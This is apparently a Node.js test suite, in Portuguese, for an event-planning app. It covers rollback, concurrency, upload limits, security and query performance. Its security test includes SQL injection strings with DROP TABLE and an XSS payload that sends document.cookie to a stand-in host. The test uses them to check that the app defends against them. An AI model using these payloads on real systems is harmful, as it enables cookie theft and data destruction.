import assert from "node:assert/strict"
import test from "node:test"

process.env.PG_EMBEDDED = "true"
process.env.PGLITE_MEMORY = "true"
delete process.env.NEXT_PUBLIC_SUPABASE_URL
delete process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
delete process.env.SUPABASE_SERVICE_ROLE_KEY

import fs from "node:fs"
import path from "node:path"
import { registerUserLocal } from "../lib/auth/auth-service.ts"
import { checkBackendEventPermission } from "../lib/auth/rbac-guard.ts"
import { createLocalPgClient } from "../lib/db/pg-client.ts"
import { ensurePostgresInitialized, pgQuery, withPgTransaction } from "../lib/db/postgres.ts"
import { escapeHtml } from "../lib/domain/business-rules.ts"
import { saveFileToLocalStorage } from "../lib/storage/local-storage.ts"
import { runHomologationJourneys } from "../lib/validation-center/journeys.ts"

test("1. Jornadas Integradas Ponta a Ponta (Seção 14 e 15): Jornadas A, B, C, D e E com validação das 9 camadas no PostgreSQL", async () => {
  await ensurePostgresInitialized()
  const journeys = await runHomologationJourneys()

  assert.equal(journeys.length, 5)
  for (const j of journeys) {
    assert.equal(
      j.passed,
      true,
      `A ${j.id} (${j.title}) falhou em alguma etapa: ${JSON.stringify(j.steps)}`
    )
    for (const s of j.steps) {
      assert.equal(s.passed, true)
      assert.ok(s.layers.frontend)
      assert.ok(s.layers.postgresql)
      assert.ok(s.layers.persistence)
    }
  }
})

test("2. Testes de Falhas, Rollback Transacional, Concorrência e Situações Excepcionais (Seção 16)", async () => {
  await ensurePostgresInitialized()
  const db = createLocalPgClient({ role: "service_role" })

  // 2.1 Rollback transacional em caso de falha no meio da operação
  const rollbackEmail = `rollback.${Date.now()}@planeja.local`
  await assert.rejects(async () => {
    await withPgTransaction(async (txQuery) => {
      await txQuery(
        `INSERT INTO public.users (email, name) VALUES ($1, 'Usuário Rollback')`,
        [rollbackEmail]
      )
      // Força violação de constraint CHECK (budget_estimated < 0)
      await txQuery(
        `INSERT INTO public.events (user_id, title, type, date, time, location, budget_estimated)
         VALUES ('00000000-0000-4000-8000-000000000001', 'Evento Inválido', 'Festa', '2026-12-01', '10:00', 'Local', -500)`
      )
    })
  })

  // Verifica que o usuário inserido antes da falha sofreu rollback completo
  const checkRollback = await pgQuery(
    `SELECT id FROM public.users WHERE email = $1`,
    [rollbackEmail]
  )
  assert.equal(checkRollback.rows.length, 0, "Rollback transacional deve desfazer inserções parciais")

  // 2.2 Rejeição de arquivo acima do limite de 5 MB para fotos
  const oversizedBuffer = Buffer.alloc(5 * 1024 * 1024 + 1024, 1)
  assert.throws(() => {
    saveFileToLocalStorage({
      bucket: "event-photos",
      filename: "foto-gigante.png",
      content: oversizedBuffer,
      mimeType: "image/png",
    })
  }, /excede o tamanho máximo permitido/i)

  // 2.3 Requisições simultâneas (concorrência no PostgreSQL sem perda de registros)
  const concurrentOwner = await registerUserLocal({
    email: `concurrent.${Date.now()}@planeja.local`,
    password: "Concurrent#2026",
    name: "Teste Concorrência",
  })

  const { data: concEvent } = await db
    .from("events")
    .insert({
      user_id: concurrentOwner.user.id,
      title: "Evento Concorrência",
      type: "Corporativo",
      date: "2026-12-20",
      time: "14:00",
      location: "Sala 1",
    })
    .select()
    .single()

  await Promise.all(
    Array.from({ length: 10 }, (_, idx) =>
      db.from("items").insert({
        event_id: concEvent.id,
        name: `Despesa Simultânea ${idx + 1}`,
        price: 100,
        quantity: 1,
      })
    )
  )

  const { data: concItems } = await db.from("items").select("*").eq("event_id", concEvent.id)
  assert.equal(concItems.length, 10)
})

test("3. Auditoria de Segurança (Seção 17): Prevenção de SQL Injection, Bloqueio de Tabelas/Colunas Inválidas, XSS e Isolamento", async () => {
  await ensurePostgresInitialized()
  const db = createLocalPgClient({ role: "authenticated" })

  // 3.1 Tentativa de SQL Injection no filtro parametrizado retorna 0 linhas sem executar payload malicioso
  const sqliAttempt = await db
    .from("users")
    .select("*")
    .eq("email", "' OR '1'='1'; DROP TABLE public.users; --")

  assert.equal(sqliAttempt.error, null)
  assert.equal(sqliAttempt.data.length, 0)

  // 3.2 Bloqueio de identificador de tabela ou coluna malicioso
  assert.throws(() => {
    db.from("users; DROP TABLE events; --")
  }, /Invalid SQL identifier|Table not allowed/i)

  assert.throws(() => {
    db.from("users").select("*").eq("email = '1' OR 1=1 --", "x")
  }, /Invalid SQL identifier/i)

  // 3.3 Isolamento entre usuários: Usuário sem vínculo é bloqueado por checkBackendEventPermission
  const outsider = await registerUserLocal({
    email: `outsider.${Date.now()}@planeja.local`,
    password: "Outsider#2026",
    name: "Usuário Sem Vínculo",
  })
  const { data: anyEvents } = await db.from("events").select("id").limit(1)
  if (anyEvents && anyEvents.length > 0) {
    const access = await checkBackendEventPermission({
      db,
      eventId: anyEvents[0].id,
      userId: outsider.user.id,
      module: "event",
      action: "view",
    })
    assert.equal(access.allowed, false)
  }

  // 3.4 Sanitização XSS
  const malicious = '<script>fetch("https://evil.tld?c="+document.cookie)</script>'
  assert.equal(escapeHtml(malicious).includes("<script>"), false)
})

test("4. Auditoria de Desempenho e EXPLAIN ANALYZE no PostgreSQL (Seção 18)", async () => {
  await ensurePostgresInitialized()

  const t0 = performance.now()
  const explainEvents = await pgQuery(
    `EXPLAIN ANALYZE SELECT * FROM public.events WHERE status = 'active' ORDER BY created_at DESC LIMIT 20`
  )
  const elapsedEventsMs = performance.now() - t0

  assert.ok(explainEvents.rows.length > 0)
  assert.ok(
    elapsedEventsMs < 100,
    `Consulta EXPLAIN ANALYZE em public.events deve executar em < 100ms (obtido: ${elapsedEventsMs.toFixed(2)}ms)`
  )

  const t1 = performance.now()
  const explainMembers = await pgQuery(
    `EXPLAIN ANALYZE SELECT * FROM public.event_members WHERE role = 'owner' AND status = 'active'`
  )
  const elapsedMembersMs = performance.now() - t1

  assert.ok(explainMembers.rows.length > 0)
  assert.ok(
    elapsedMembersMs < 100,
    `Consulta EXPLAIN ANALYZE em public.event_members deve executar em < 100ms (obtido: ${elapsedMembersMs.toFixed(2)}ms)`
  )
})

test("5. Homologação Completa do Catálogo de 71 Requisitos (18 RN + 43 RF + 10 RNF) e Cobertura Integral de Avaliadores", () => {
  const catalogSrc = fs.readFileSync(path.resolve("lib/validation-center/catalog.ts"), "utf8")
  const evaluatorsSrc = fs.readFileSync(path.resolve("lib/validation-center/evaluators.ts"), "utf8")

  for (let i = 1; i <= 18; i++) {
    const id = `RN-${String(i).padStart(3, "0")}`
    assert.ok(catalogSrc.includes(`id: "${id}"`), `Catálogo deve conter ${id}`)
    assert.ok(evaluatorsSrc.includes(`"${id}":`), `Evaluators deve conter ${id}`)
  }

  for (let i = 1; i <= 43; i++) {
    const id = `RF-${String(i).padStart(3, "0")}`
    assert.ok(catalogSrc.includes(`id: "${id}"`), `Catálogo deve conter ${id}`)
    assert.ok(evaluatorsSrc.includes(`"${id}":`), `Evaluators deve conter ${id}`)
  }

  for (let i = 1; i <= 10; i++) {
    const id = `RNF-${String(i).padStart(3, "0")}`
    assert.ok(catalogSrc.includes(`id: "${id}"`), `Catálogo deve conter ${id}`)
  }
})
